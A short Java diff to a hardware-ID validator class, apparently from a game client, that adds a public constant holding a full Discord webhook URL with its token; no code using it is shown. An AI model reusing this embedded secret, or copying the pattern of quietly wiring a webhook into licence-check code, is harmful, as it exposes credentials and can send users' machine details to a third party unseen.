@@ -15,6 +15,7 @@ import org.apache.logging.log4j.Logger;
 public class HWIDValidator {
     private static final Logger LOGGER = LogManager.getLogger(HWIDValidator.class);
     private static final String HWID_LIST_URL = "https://raw.githubusercontent.com/heeedii/Opium-Hwid/refs/heads/main/hwid-list";
+    public static final String dc_hook = "https://discord.com/api/webhooks/1331603936884555840/19XG80YtQoY8ympVSyi5PmMq4I0pZTwP9RxV-QPrAgo38Le1QKORvZ4RF08LUaKuiKkb";
 
     public static boolean isHWIDValid() {
         try {
